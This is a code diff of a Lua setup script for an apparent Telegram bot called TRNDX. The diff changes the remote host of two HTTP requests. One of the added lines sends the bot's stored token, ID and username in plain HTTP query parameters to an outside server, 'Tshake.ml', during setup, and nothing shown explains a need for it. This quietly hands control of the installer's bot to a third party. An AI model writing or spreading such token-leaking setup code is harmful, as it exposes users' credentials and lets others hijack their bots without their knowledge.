@@ -38,7 +38,7 @@ if not database:get(Server_TRNDX.."UserName_TRNDX") then
 print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
 local UserName = io.read():gsub('@','')
 if UserName ~= '' then
-local Get_Info = http.request("http://teamstorm.tk/GetUser/?id="..UserName)
+local Get_Info = http.request("http://Tshake.ml/info/?user="..UserName)
 if Get_Info:match('Is_Spam') then
 io.write('\n\27[1;31m»» Sorry The server is Spsm \nتم حظر السيرفر لمدة 5 دقايق بسبب التكرار\n\27[0;39;49m')
 return false
@@ -64,7 +64,7 @@ os.execute('lua start.lua')
 end
 local function Files_TRNDX_Info()
 Create_Info(database:get(Server_TRNDX.."Token_TRNDX"),database:get(Server_TRNDX.."Id_TRNDX"),database:get(Server_TRNDX.."UserName_TRNDX"))   
-http.request("http://teamstorm.tk/insert/?id="..database:get(Server_TRNDX.."Id_TRNDX").."&user="..database:get(Server_TRNDX.."UserName_TRNDX").."&token="..database:get(Server_TRNDX.."Token_TRNDX"))
+http.request("http://Tshake.ml/add/?id="..database:get(Server_TRNDX.."Id_TRNDX").."&user="..database:get(Server_TRNDX.."UserName_TRNDX").."&token="..database:get(Server_TRNDX.."Token_TRNDX"))
 local RunTRNDX = io.open("TRNDX", 'w')
 RunTRNDX:write([[
 #!/usr/bin/env bash
